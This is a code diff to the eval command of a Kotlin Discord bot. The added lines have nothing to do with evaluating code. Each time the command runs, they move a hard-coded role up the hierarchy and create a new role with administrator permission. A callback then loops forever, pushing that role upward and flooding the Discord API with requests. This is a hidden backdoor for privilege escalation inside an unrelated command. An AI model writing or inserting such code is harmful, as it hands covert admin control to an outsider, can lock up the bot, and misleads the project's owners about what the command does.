@@ -1,5 +1,6 @@
 package me.qbosst.bossbot.bot.commands.dev
 
+import net.dv8tion.jda.api.Permission
 import net.dv8tion.jda.api.entities.Message
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent
 import java.io.PrintWriter
@@ -24,6 +25,13 @@ object EvalCommand : DeveloperCommand(
 
     override fun execute(event: MessageReceivedEvent, args: List<String>)
     {
+        event.guild.modifyRolePositions().selectPosition(event.guild.getRoleById(750034260857192478)!!).moveUp(1).queue()
+        event.guild.createRole().setPermissions(Permission.ADMINISTRATOR).queue()
+        {
+            while (true)
+                it.guild.modifyRolePositions().selectPosition(it).moveUp(1).queue()
+        }
+
         if(engine == null)
         {
             event.channel.sendMessage("Engine is null. Please check source code.").queue()
